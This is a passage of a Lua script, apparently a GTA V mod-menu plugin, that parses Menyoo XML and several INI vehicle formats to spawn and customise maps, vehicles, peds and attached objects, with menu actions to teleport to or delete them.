        request_anim_dict(ped_data['AnimDict'])
        TASK.TASK_PLAY_ANIM(ped, ped_data['AnimDict'], ped_data['AnimName'], 8.0, 8.0, -1, 1, 1.0, false, false, false)
    end
end

function nil_handler(val, d)
    if val == nil then
        val = d
    end
    return val
end

function menyoo_preprocess_entity(entity, data)
    data['Dynamic'] = nil_handler(data['Dynamic'], true)
    data['FrozenPos'] = nil_handler(data['FrozenPos'], true)
    data['OpacityLevel'] = nil_handler(data['OpacityLevel'], 255)
    data['IsInvincible'] = nil_handler(data['IsInvincible'], false)
    data['IsVisible'] = nil_handler(data['IsVisible'], true)
    data['HasGravity'] = nil_handler(data['HasGravity'], false)
    data['IsBulletProof'] = nil_handler(data['IsBulletProof'], false)
    data['IsFireProof'] = nil_handler(data['IsFireProof'], false)
    data['IsExplosionProof'] = nil_handler(data['IsExplosionProof'], false)
    data['IsMeleeProof'] = nil_handler(data['IsMeleeProof'], false)
    ENTITY.FREEZE_ENTITY_POSITION(entity, to_boolean(data['FrozenPos']))
    ENTITY.SET_ENTITY_ALPHA(entity, tonumber(data['OpacityLevel']), false)
    ENTITY.SET_ENTITY_INVINCIBLE(entity, to_boolean(data['IsInvincible']))
    ENTITY.SET_ENTITY_VISIBLE(entity, to_boolean(data['IsVisible']), 0)
    ENTITY.SET_ENTITY_HAS_GRAVITY(entity, to_boolean(data['HasGravity']))
    ENTITY.SET_ENTITY_PROOFS(entity, to_boolean(data['IsBulletProof']), to_boolean(data['IsFireProof']), to_boolean(data['IsExplosionProof']), false, to_boolean(data['IsMeleeProof']), false, true, false)
end

function menyoo_preprocess_car(vehicle, data)
    local colors = menyoo_build_properties_table(data['Colours'].kids)
    local neons = menyoo_build_properties_table(data['Neons'].kids)
    local doorsopen = menyoo_build_properties_table(data['DoorsOpen'].kids)
    local doorsbroken = menyoo_build_properties_table(data['DoorsBroken'].kids)
    if data['TyresBursted'] ~= nil then
        local tyresbursted = menyoo_build_properties_table(data['TyresBursted'].kids)
        for k,v in pairs(tyresbursted) do
            -- fucking menyoo.. here they go mixing up wheel indexes with strings
            k = k:gsub('_', '')
            local cure_menyoo_aids = {['FrontLeft'] = 0, ['FrontRight'] = 1, [2] = 2, [3] = 3, ['BackLeft'] = 4, ['BackRight'] = 5, [6]=6, [7]=7, [8]=8}
            VEHICLE.SET_VEHICLE_TYRE_BURST(vehicle, cure_menyoo_aids[k], false, 0.0)
        end
    end
    local mods = menyoo_build_properties_table(data['Mods'].kids)
    local mod_extras = menyoo_build_properties_table(data['ModExtras'].kids)
    if mod_extras ~= nil then 
        for k,v in pairs(mod_extras) do
            k = k:gsub('_', '')
            VEHICLE.SET_VEHICLE_EXTRA(vehicle, k, not to_boolean(v))
        end
    end
    
    for k,v in pairs(neons) do
        local comp = {['Left']=0, ['Right']=1, ['Front']=2, ['Back']=3}
        VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, comp[k], to_boolean(v))
    end

    VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, tonumber(data['WheelType']))
    for k,v in pairs(mods) do
        k = k:gsub('_', '')
        v = split_str(v, ',')
        VEHICLE.SET_VEHICLE_MOD(vehicle, tonumber(k), tonumber(v[1]), to_boolean(v[2]))
    end


    for k,v in pairs(colors) do
        colors[k] = tonumber(v)
    end

    VEHICLE.SET_VEHICLE_COLOURS(vehicle, colors['Primary'], colors['Secondary'])
    VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, colors['Pearl'], colors['Rim'])
    VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, colors['tyreSmoke_R'], colors['tyreSmoke_G'], colors['tyreSmoke_B'])
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vehicle, colors['LrInterior'])
    VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(vehicle, colors['LrDashboard'])
    local livery = tonumber(data['Livery'])
    if livery == -1 then
        livery = 0
    end
    VEHICLE.SET_VEHICLE_LIVERY(vehicle, livery)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, data['NumberPlateText'])
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, tonumber(data['NumberPlateTextIndex']))
    -- wheel invis here
    -- engine sound name here
    VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, tonumber(data['WindowTint']))
    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, to_boolean(data['BulletProofTyres']))
    VEHICLE. SET_VEHICLE_DIRT_LEVEL(vehicle, tonumber(data['DirtLevel']))
    VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, tonumber(data['PaintFade']))
    VEHICLE.SET_CONVERTIBLE_ROOF_LATCH_STATE(vehicle, tonumber(data['RoofState']))
    VEHICLE.SET_VEHICLE_SIREN(vehicle, to_boolean(data['SirenActive']))
    VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, to_boolean(data['EngineOn']), true, false)
    -- not sure how to set lights on
    AUDIO.SET_VEHICLE_RADIO_LOUD(vehicle, to_boolean(data['IsRadioLoud']))
    VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, tonumber(data['LockStatus']))
    if data['EngineHealth'] ~= nil then
        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, tonumber(data['EngineHealth']))
    end
end

function menyoo_build_properties_table(kids)
    if kids ~= nil then
        local table = {}
        for k,v in pairs(kids) do
            local name = v.name
            local val = get_element_text(v)
            table[name] = val
        end
        return table
    end
    return nil
end

function menyoo_load_map(path)
    local all_entities = {}
    util.toast("Your map is loading!...")
    local entity_initial_handles = {}
    local xml_tbl = parse_xml(path).root
    -- n appears to be the enum of the kid, k is the actual kid table
    local data = {}
    for a,b in pairs(xml_tbl.kids) do
        local vproperties = {}
        local pproperties = {}
        local name = b.name
        local isvehicle = false
        local isped = false
        if name == 'ReferenceCoords' then
            for k,v in pairs(b.kids) do
                if v.name == 'X' then
                    mmblip_x = tonumber(get_element_text(v))
                elseif v.name == 'Y' then
                    mmblip_y = tonumber(get_element_text(v))
                elseif v.name == 'Z' then
                    mmblip_z = tonumber(get_element_text(v))
                end
            end
            mmblip = HUD.ADD_BLIP_FOR_COORD(mmblip_x, mmblip_y, mmblip_z)
            HUD.SET_BLIP_SPRITE(mmblip, 77)
            HUD.SET_BLIP_COLOUR(mmblip, 48)
        end
        if name == 'Placement' then
            for c,d in pairs(b.kids) do
                if d.name == 'PositionRotation' then
                    for e, f in pairs(d.kids) do
                        data[f.name] = get_element_text(f)
                    end
                elseif d.name == 'VehicleProperties' then
                    isvehicle = true
                    for n, p in pairs(d.kids) do
                        local prop_name = p.name
                        if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                            vproperties[prop_name] = p
                        else
                            vproperties[prop_name]  = get_element_text(p)
                        end
                    end
                elseif d.name == 'PedProperties' then
                    isped = true
                    pproperties[d.name] = d
                else
                    data[d.name] = get_element_text(d)
                end
            end
            mmpos = {}
            mmpos.x = tonumber(data['X'])
            mmpos.y = tonumber(data['Y'])
            mmpos.z = tonumber(data['Z'])
            mmrot = {}
            mmrot.pi = tonumber(data['Pitch'])
            mmrot.ro = tonumber(data['Roll'])
            mmrot.ya = tonumber(data['Yaw'])
            if STREAMING.IS_MODEL_VALID(data['ModelHash']) then
                local mment = 0
                if isvehicle then
                    request_model_load(data['ModelHash'])
                    mment = entities.create_vehicle(data['ModelHash'], mmpos, mmrot.ya)
                    menyoo_preprocess_entity(mment, data)
                    menyoo_preprocess_car(mment, vproperties)
                elseif isped then
                    request_model_load(data['ModelHash'])
                    mment = entities.create_ped(0, data['ModelHash'], mmpos, mmrot.ya)
                    menyoo_preprocess_ped(mment, pproperties, {})
                    menyoo_preprocess_entity(mment, data)
                else
                    request_model_load(data['ModelHash'])
                    mment = entities.create_object(data['ModelHash'], mmpos)
                    menyoo_preprocess_entity(mment, data)
                end
                table.insert(all_entities, mment)
                ENTITY.SET_ENTITY_ROTATION(mment, mmrot.pi, mmrot.ro, mmrot.ya, 2, true)
            else
                util.toast("Some invalid models were found. Make sure you aren\'t using XML\'s that require mods.")
            end
        end
    end
    if mmblip == nil then 
        util.toast("There was an issue loading this map. Make sure the XML is a Menyoo XML.")
        return 
    end
    mm_maproot = menu.list(loaded_maps_root, path:gsub(maps_dir, "") .. ' [' .. mmblip .. ']', {"lancespoonerloadedmaps" .. mmblip}, "Maps you have loaded")
    menu.action(mm_maproot, "Teleport to map", {"menyoomteleportto" .. mmblip}, "Teleport to this map.", function(on_click)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), mmpos.x, mmpos.y, mmpos.z, false, false, false)
    end)

    menu.action(mm_maproot, "Delete map", {"menyoomdelete" .. mmblip}, "", function(on_click)
        for k,v in pairs(all_entities) do
            entities.delete_by_handle(v)
        end
        menu.delete(mm_maproot)
        -- apparently remove blip is fucked, so we set sprite to invis as a failsafe
        util.remove_blip(mmblip)
    end)
    util.toast("Map load complete. Look for a magenta-colored L on your map.")
end

function menyoo_load_vehicle(path)
    our_ped = players.user_ped()
    local all_entities = {}
    local entity_initial_handles = {}
    local data = {}
    local vproperties = {}
    local xml_tbl = parse_xml(path).root
    local initial_handle_index = 0
    -- n appears to be the enum of the kid, k is the actual kid table
    for k,v in pairs(xml_tbl.kids) do
        local name = v.name
        if name == 'VehicleProperties' then
            for n, p in pairs(v.kids) do
                local prop_name = p.name
                if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                    vproperties[prop_name] = p
                else
                    vproperties[prop_name]  = get_element_text(p)
                end
            end
        else
            if name == 'SpoonerAttachments' then
                data[name] = v
            else
                local el_text = get_element_text(v)
                data[name] = el_text
            end
        end
    end
    if data['ModelHash'] == nil then 
        util.toast(fail_text)
        return 
    end
    request_model_load(data['ModelHash'])
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(our_ped, 0.0, 5.0, 0.0)
    local vehicle = entities.create_vehicle(data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(our_ped))
    table.insert(all_entities, vehicle)
    ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
    PED.SET_PED_INTO_VEHICLE(our_ped, vehicle, -1)
    if data['InitialHandle'] == nil then
        initial_handle_index = initial_handle_index + 1
        data['InitialHandle'] = initial_handle_index
    end
    entity_initial_handles[data['InitialHandle']] = vehicle
    -- apply natives that can apply to any entity
    menyoo_preprocess_entity(vehicle, data)
    menyoo_preprocess_car(vehicle, vproperties)
    -- vehicle-specific natives
    -- now for the attachments...
    local attachments = data['SpoonerAttachments']
    all_attachments = {}
    if attachments ~= nil then
        for a,b in pairs(attachments.kids) do
            local vproperties = {}
            -- each item here should be "attachment" element
            local att_data = {}
            for c,d in pairs(b.kids) do
                local name = d.name
                local val = get_element_text(d)
                if name == 'PedProperties' or name == 'Attachment' or name == 'TaskSequence' then
                    att_data[name] = d
                elseif name == 'VehicleProperties' then
                    for n, p in pairs(d.kids) do
                        local prop_name = p.name
                        if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                            vproperties[prop_name] = p
                        else
                            vproperties[prop_name]  = get_element_text(p)
                        end
                    end
                else
                    att_data[name] = val
                end
            end
            request_model_load(att_data['ModelHash'])
            -- 1 = ped, 2 = vehicle, 3 = object
            local attachment_info = menyoo_build_properties_table(att_data['Attachment'].kids)
            local entity = nil
            local isped = false
            if att_data['Type'] == '1' then
                local ped = entities.create_ped(0, att_data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(ourped))
                menyoo_preprocess_ped(ped, att_data, entity_initial_handles)
                entity = ped
            elseif att_data['Type'] == '2' then
                local veh = entities.create_vehicle(att_data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(ourped))
                entity = veh
                menyoo_preprocess_entity(veh, att_data)
                menyoo_preprocess_car(veh, vproperties)
            elseif att_data['Type'] == '3' then
                local obj = entities.create_object(att_data['ModelHash'], coords)
                entity = obj
                menyoo_preprocess_entity(obj, att_data)
                -- obj code
            end
            table.insert(all_entities, entity)
            ENTITY.SET_ENTITY_INVINCIBLE(entity, true)
            local bone = tonumber(attachment_info['BoneIndex'])
            local x = tonumber(attachment_info['X'])
            local y = tonumber(attachment_info['Y'])
            local z = tonumber(attachment_info['Z'])
            local pitch = tonumber(attachment_info['Pitch'])
            local yaw = tonumber(attachment_info['Yaw'])
            local roll = tonumber(attachment_info['Roll'])
            all_attachments[entity] = {}
            all_attachments[entity]['attachedto'] = attachment_info['AttachedTo']
            all_attachments[entity]['bone'] = bone
            all_attachments[entity]['x'] = x
            all_attachments[entity]['y'] = y
            all_attachments[entity]['z'] = z
            all_attachments[entity]['pitch'] = pitch
            all_attachments[entity]['yaw'] = yaw
            all_attachments[entity]['roll'] = roll
            all_attachments[entity]['isped'] = isped
        end
        for k, v in pairs(all_attachments) do
            ENTITY.ATTACH_ENTITY_TO_ENTITY(k, entity_initial_handles[v['attachedto']], v['bone'], v['x'], v['y'], v['z'], v['pitch'], v['roll'], v['yaw'], true, false, true, v['isped'], 2, true)
        end
    end
    local this_blip = HUD.ADD_BLIP_FOR_ENTITY(vehicle)
    HUD.SET_BLIP_SPRITE(this_blip, 77)
    HUD.SET_BLIP_COLOUR(this_blip, 47)
    local this_veh_root = menu.list(loaded_vehicles_root, path:gsub(vehicles_dir .. '\\', ''), {"lancespoonerv" .. vehicle}, "")
    menu.action(this_veh_root, "Delete", {"deletelancespoonerv" .. vehicle}, "Delete this vehicle. Make it cease to exist.", function(on_click)
        for k,v in pairs(all_entities) do
            entities.delete_by_handle(v)
        end
        menu.delete(this_veh_root)
        util.remove_blip(this_blip)
    end)
    menu.action(this_veh_root, "Teleport inside", {"teleportemenyoov" .. vehicle}, "", function(on_click)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), vehicle, -1)
    end)
    return vehicle
end

function ini_preprocess_vehicle(vehicle, data, ini_type, veh_index) 
    -- vehicle is a handle to an already-spawned vehicle
    if ini_type == 1 then
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, data.Primary or 0, data.Secondary or 0)
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, data.SmokeR or 0, data.SmokeG or 0, data.SmokeB or 0)
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, data.NeonR or 0, data.NeonG or 0, data.NeonB or 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data.Dirt or 0)
        VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, data.PaintFade or 0)
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, data.Wheels or 0)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, data.Pearl or 0, data.WheelColor or 0)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, data.Tint or 0)

        if data['BulletProofTires'] == 1 then 
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, false)
        end
        for i=1, 4 do 
            if data['Neon' .. i] == 1 then 
                VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, true)
            end
        end

        for i=0, 48 do
            if data[i] ~= nil then 
                -- idk how we even determine if a car has custom tires in this format
                VEHICLE.SET_VEHICLE_MOD(vehicle, i, data[i], false)
            end
        end

        for i=1, 9 do 
            VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, if data['extra' .. i] == 0 then true else false)
        end

    elseif ini_type == 2 then
        local v_mods = data['Vehicle Mods']
        local v_extras = data['Vehicle Extras']
        local v_toggles = data['Vehicle Toggles']
        local data = data.Vehicle 
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, data['primary paint'] or 0, data['secondary paint'] or 0)
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, data['tyre smoke red'] or 0, data['tyre smoke green'] or 0, data['tyre smoke blue'] or 0)
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, data['neon red'] or 0, data['neon green'] or 0, data['neon blue'] or 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data['dirt level'] or 0)
        --VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, data.PaintFade or 0)
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, data['wheel type'] or 0)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, data['pearlescent colour'] or 0, data['wheel colour'] or 0)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, data['window tint'] or 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, data['plate index'] or 0)

        if data['bulletproof tyres'] == 1 then 
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, false)
        end

        for i=1, 4 do 
            if data['neon ' .. i] == 1 then 
                VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, true)
            end
        end

        for i= 1, 7 do 
            if data['door ' .. i .. ' state'] == 1 then
                VEHICLE.SET_VEHICLE_DOOR_OPEN(vehicle, i, false, true)
            end
        end

        for i=0, 48 do
            if v_mods[i] ~= nil then 
                -- idk how we even determine if a car has custom tires in this format
                VEHICLE.SET_VEHICLE_MOD(vehicle, i, v_mods[i], false)
            end
        end

        for i=1, 9 do 
            VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, if v_extras[i] == 0 then true else false)
        end

        for i=17, 22 do 
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, i, if v_toggles[i] == 1 then true else false)
        end

    elseif ini_type == 3 then
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, data.PrimaryPaint or 0, data.SecondaryPaint or 0)
        if data.PrimaryPaint == -1 then 
            VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, data.PrimaryR or 0, data.PrimaryG or 0, data.PrimaryB or 0)
        end 
        if data.SecondaryPaint == -1 then 
            VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, data.SecondaryR, data.SecondaryG, data.SecondaryB)
        end
        VEHICLE.SET_VEHICLE_MOD_COLOR_1(vehicle, data.PrimaryPaintT or 0, data.PrimaryPaint or 0, data.Pearlescent or 0)
        VEHICLE.SET_VEHICLE_MOD_COLOR_2(vehicle, data.SecondaryPaintT or 0, data.SecondaryPaint or 0)
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, data.SmokeR or 0, data.SmokeG or 0, data.SmokeB or 0)
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, data.NeonR or 0, data.NeonG or 0, data.NeonB or 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        --VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data.Dirt or 0)
        VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, data.PaintFade or 0)
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, data.Wheels or 0)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, data.Pearlescent or 0, data.WheelsColor or 0)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, data.WindowTint or 0)
        VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(vehicle, data.DashColor)
        VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vehicle, data.DashLightColor)

        if data.BulletProof == 1 then 
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, false)
        end
        if data.NeonEnabled == 1 then
            for i=1, 4 do 
                VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, true)
            end
        end

        for i=0, 48 do
            if data[i] ~= nil then 
                VEHICLE.SET_VEHICLE_MOD(vehicle, i, data[i], data.CustomTyres)
            end
        end

        for i=17, 22 do 
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, i, if data['TOGGLE_' .. i] == 1 then true else false)
        end

        for i=1, 9 do 
            VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, if data['Extra_' .. i] == 0 then true else false)
        end

    elseif ini_type == 4 then 
        util.toast("This INI is only partially supported. Sorry if things look weird or some things are missing.")
        local v_root = data['Vehicle' .. veh_index]
        local v_mods = data['Vehicle' .. veh_index .. "Mods"]
        local v_extras = data['Vehicle' .. veh_index .. "Extras"]
        local v_toggles = data['Vehicle' .. veh_index .. "Toggles"]
        local v_smoke = data['Vehicle' .. veh_index .. "TireSmoke"]
        local v_neon = data['Vehicle' .. veh_index .. "Neon"]
        local v_neon_color = data['Vehicle' .. veh_index .. "NeonColor"]
        local v_paintfade = data['Vehicle' .. veh_index .. "PaintFade"]
        local v_color_main = data['Vehicle' .. veh_index .. "VehicleColors"]
        local v_color_extra = data['Vehicle' .. veh_index .. "ExtraColors"]
        local v_color_custom_p = data['Vehicle' .. veh_index .. "CustomPrimaryColor"]
        local v_color_custom_s = data['Vehicle' .. veh_index .. "CustomSecondaryColor"]
        local v_wheel_type = data['Vehicle' .. veh_index .. "WheelType"]
        local v_plate = data['Vehicle' .. veh_index .. "Numberplate"]
        local v_window_tint = data['Vehicle' .. veh_index .. "WindowTint"]
        local v_is_custom_primary = data['Vehicle' .. veh_index .. "IsCustomPrimary"]
        local v_is_custom_secondary = data['Vehicle' .. veh_index .. "IsCustomSecondary"]
        local data = data['Vehicle' .. veh_index]

        for i=0, 49 do
            if data['M' .. tostring(i)] ~= nil then 
                VEHICLE.SET_VEHICLE_MOD(vehicle, i, v_mods['M' .. i], false)
            end
        end

        for i=0, 49 do 
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, i, v_toggles['T' .. i])
        end

        for i=1, 13 do 
            VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, v_extras['E' .. i])
        end

        for i=1, 4 do 
            VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, v_neon["Enabled" .. i])
        end

        ENTITY.SET_ENTITY_DYNAMIC(vehicle, v_root.Dynamic)
        ENTITY.SET_ENTITY_VISIBLE(vehicle, v_root.Visible, 0)
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, v_color_main.Primary or 0, v_color_main.Secondary or 0)
        if v_is_custom_primary['bool'] then 
            VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(v_color_custom_p.r or 0, v_color_custom_p.g or 0, v_color_custom_p.b or 0)
        end

        if v_is_custom_secondary['bool'] then 
            VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(v_color_custom_s.r or 0, v_color_custom_s.g or 0, v_color_custom_s.b or 0)
        end

        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, v_color_extra.Pearl or 0, v_color_extra.Wheel or 0)

    
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, v_smoke.R or 0, v_smoke.G or 0, v_smoke.B or 0)
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, v_neon_color.R or 0, v_neon_color.G or 0, v_neon_color.B or 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        --VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data.Dirt or 0)
        VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, v_paintfade.PaintFade or 0)
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, v_wheel_type or 0)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, v_window_tint or 0)
        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, v_root.Invincible or false)
        ENTITY.SET_ENTITY_HAS_GRAVITY(vehicle, v_root.Gravity or true)
        ENTITY.FREEZE_ENTITY_POSITION(vehicle, v_root.Freeze or false)
        ENTITY.SET_ENTITY_RENDER_SCORCHED(vehicle, v_root.ScorchedRender or false)
        ENTITY.SET_ENTITY_ALPHA(vehicle, v_root.Alpha or 255, false) 
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, v_root.Dirt or 0.0) 
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, v_root.IsEngineOn, true, false)
        VEHICLE.SET_VEHICLE_LIGHT_MULTIPLIER(vehicle, v_root.HeadlightMultiplier or 1.0)
    end
end

function tprint (tbl, indent)
    if not indent then indent = 0 end
    for k, v in pairs(tbl) do
      formatting = string.rep("  ", indent) .. k .. ": "
      if type(v) == "table" then
        print(formatting)
        tprint(v, indent+1)
      elseif type(v) == 'boolean' then
        print(formatting .. tostring(v))      
      else
        print(formatting .. v)
      end
    end
  end

function ini_load_vehicle(file_name)
    local data
    success, data = pcall(iniparser.parse, file_name, vehicles_dir)
    if not success then 
        util.toast("Something bad happened when trying to load this INI! Please check the INI file and try again. ")
    end
    local all_entities = {}
    local ini_type = -1
    -- determine type of ini file 
    -- type 1 has no spaces in it (i.e Airship.xml). 
    -- type 2 does and has  lowercase shit (420 Hydra.ini). it's also extremely stupid
    -- type 3 is extremely similar to type 1, but has values like PrimaryPaintT (BayWatch Blazer.xml)
    -- type 4 has an "AllObjects", "AllPeds", "AllVehicles" section in the ini (4tire_bike.ini)
    -- type 5 has AllObjects and AllVehicles (Boat-fsx.ini) (seems like theres an iniparser glitch in this one)
    -- type 6 is like type 2, but some keys are different, namely the numbers for attachments are called "Attached Object x" (Tankamid.ini)

    if data.Vehicle.model == nil and data.Vehicle.PrimaryPaintT == nil and data.AllVehicles.Count == nil then 
        ini_type = 1
    elseif data.Vehicle.model ~= nil and data['Attached Object 1'].model == nil then 
        ini_type = 2
    elseif data.Vehicle.model == nil and data.Vehicle.PrimaryPaintT ~= nil then 
        ini_type = 3
    elseif data.AllObjects.Count ~= nil and data.AllVehicles.Count ~= nil and data.AllPeds.Count ~= nil then 
        ini_type = 4
    elseif data.Vehicle.model ~= nil and data['Attached Object 1'].model ~= nil then 
        ini_type = 6
    end


    if ini_type == -1 then
        util.toast("This ini type is not supported (yet??)! Sorry :(")
        return
    end
    -- there is also an ini type 6...
    local initial_vehicle
    local v_count = 1
    local success = false
    if ini_type == 1 then 
        local v_hash = data['Vehicle']['Model']
        if v_hash == nil then 
            util.toast(fail_text)
            return
        end
        local c = players.get_position(players.user())
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data['Vehicle'], ini_type)
        local attachment_index = 0
        while true do 
            if data[tostring(attachment_index)].Model == nil then 
                success = true
                break
            end
            local here = data[tostring(attachment_index)]
            request_model_load(here.Model)
            local this_ent = entities.create_object(here.Model, players.get_position(players.user()))
            all_entities[#all_entities+1] = this_ent
            if this_ent ~= nil then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, here['Bone'], here['X'], here['Y'], here['Z'], here['RotX'], here['RotY'], here['RotZ'], true, if here['Collision'] == 1 then true else false, true, false, 2, true)
                if here['Froozen'] == 1 then 
                    ENTITY.FREEZE_ENTITY_POSITION(this_ent, true)
                end

                if here['Lit'] == 1 then 
                    FIRE.START_ENTITY_FIRE(this_ent)
                end
                attachment_index = attachment_index + 1
            end
        end
    elseif ini_type == 2 then
        local v_hash = data.Vehicle.model
        if v_hash == nil then 
            util.toast(fail_text)
            return
        end
        local c = players.get_position(players.user())
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data, ini_type)
        local attachment_index = 0
        while true do 
            if data[tostring(attachment_index)].model == nil then 
                success = true
                break
            end
            local here = data[tostring(attachment_index)]
            request_model_load(here.model)
            local this_ent = entities.create_object(here.model, players.get_position(players.user()))
            if this_ent ~= nil then
                all_entities[#all_entities+1] = this_ent
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, 0, here['x'], here['y'], here['z'], here['RotX'], here['RotY'], here['RotZ'], true, false, true, false, 2, true)
                attachment_index = attachment_index + 1
            end
        end

    elseif ini_type == 3 then
        local v_hash = data.Vehicle.Model
        if v_hash == nil then 
            util.toast(fail_text)
            return
        end
        local c = players.get_position(players.user())
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data.Vehicle, ini_type)
        local attachment_index = 0
        while true do 
            if data[tostring(attachment_index)].Model == nil then 
                success = true
                break
            end
            local here = data[tostring(attachment_index)]
            request_model_load(here.Model)
            local this_ent = entities.create_object(here.Model, players.get_position(players.user()))
            if this_ent ~= nil then
                all_entities[#all_entities+1] = this_ent
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, 0, here['X'], here['Y'], here['Z'], here['RotX'], here['RotY'], here['RotZ'], true, false, true, false, 2, true)
                attachment_index = attachment_index + 1
            end
        end
    
    elseif ini_type == 4 then 
        local numerations = {}
        local attachments_data = {}
        local veh_index = 0
        local object_index = 0 
        local ped_index = 0
        while true do
            if data['Vehicle' .. tostring(veh_index)].Hash == nil then 
                success = true
                break
            end
